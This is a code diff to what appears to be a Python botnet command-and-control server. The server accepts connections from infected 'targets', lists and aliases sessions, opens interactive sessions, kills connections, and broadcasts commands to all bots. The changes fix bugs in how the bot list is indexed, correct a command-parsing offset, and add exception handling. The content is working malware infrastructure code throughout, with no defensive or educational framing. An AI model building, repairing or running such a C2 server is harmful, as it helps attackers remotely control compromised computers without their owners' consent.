@@ -38,9 +38,14 @@ def accept_connections():
         sock.settimeout(1)
         try:
             target, ip = sock.accept()
-            bot = Bot(ip, target)
+            print(target, ip)
+            try:
+                bot = Bot(target,ip)
+            except Exception as e:
+                print(e)
+                pass
             print(Colour().green(str(ip) + ' has connected!') +
-                  '\n[**] Command & Control Center: ', end="")
+                    '\n[**] Command & Control Center: ', end="")
         except:
             pass
 
@@ -65,8 +70,8 @@ def handle_value_error(e):
     print(Colour().red('[!!] ValueError: ' + str(e)))
 
 def list_targets():
-    for i in enumerate(Bot.botList):
-        print('Session ' + str(i.id) + ' --- ' + str(i.ip) + ' --- ' + str(i.alias))
+    for i in Bot.botList:
+        print('Session ' + str(Bot.botList[i].id) + ' --- ' + str(Bot.botList[i].ip) + ' --- ' + str(Bot.botList[i].alias))
 
 def set_alias(command):
     session_id = int(command[5:])
@@ -78,7 +83,7 @@ def set_alias(command):
 
 def close_all_target_connections():
     for target in Bot.botList:
-        target.kill()
+        Bot.botList[target].kill()
 
 def join_thread(t1):
     t1.join()
@@ -103,7 +108,7 @@ def kill_target(command):
 
 def handle_session_command(command):
     try:
-        session_id = int(command[8:])
+        session_id = int(command[7:])
         i = Bot.botList[session_id]
         i.communication()
     except Exception as e:
@@ -115,8 +120,8 @@ def send_all(command):
     print(Colour.green('Target sessions!'))
     try:
         for target in Bot.botList:
-            print(target.target)
-            target.reliable_send(command)
+            # print(Bot.botList[target].target)
+            Bot.botList[target].reliable_send(command)
     except Exception as e:
         print(f'Failed to send command to all targets. Error: {e}')
 
